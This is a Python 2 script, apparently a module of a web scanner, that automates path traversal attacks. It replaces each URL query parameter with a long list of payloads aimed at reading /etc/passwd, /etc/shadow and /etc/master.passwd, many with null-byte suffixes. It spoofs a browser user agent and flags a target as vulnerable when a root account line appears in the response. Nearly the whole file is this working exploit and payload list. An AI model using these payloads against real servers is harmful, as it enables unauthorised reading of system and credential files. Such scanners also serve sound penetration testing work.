import re
from urllib import FancyURLopener
import urllib

__author__ = '@asim_jaweesh'

import urllib2

app = None

options = {}

## TODO: recieve a url, check for traversal, add in the db file

class UserAgent(FancyURLopener):
    version = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/99.0'



useragent = UserAgent()

def main_function(url, payloads, check):
    opener = urllib.urlopen(url)
    vuln = 0


    if str(5) in str(opener.code):
        app.print_line("Server Error!")

    for params in url.split("?")[1].split("&"):
        params =  params.split("=")[1]
        for payload in payloads:
            bugs = url.replace(params,  str(payload).strip())
            request = useragent.open(bugs)
            html = request.readlines()
            for line in html:
                checker = re.findall(check, line)
                if len(checker) != 0:
                    app.print_line("[*] Bingo! %s " % bugs)
                    #vurl = url.split('/')[2]
                    vuln += 1


    if vuln == 0:
        app.print_line("[!] Target is not vulnerable!")



def do_traverse(url):
    payloads = ['/etc/master.passwd','/master.passwd','etc/passwd','etc/shadow%00','/etc/passwd','/etc/passwd%00','../etc/passwd','../etc/passwd%00',
'../../etc/passwd','../../etc/passwd%00','../../../etc/passwd','../../../etc/passwd%00','../../../../etc/passwd','../../../../etc/passwd%00',
'../../../../../etc/passwd','../../../../../etc/passwd%00','../../../../../../etc/passwd','../../../../../../etc/passwd%00','../../../../../../../etc/passwd',
'../../../../../../../etc/passwd%00','../../../../../../../../etc/passwd','../../../../../../../../etc/passwd%00',
'../../../../../../../../../etc/passwd','../../../../../../../../../etc/passwd%00','../../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../etc/passwd','../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00']
    check = re.compile('root.*bash$', re.I)
    main_function(url, payloads, check)


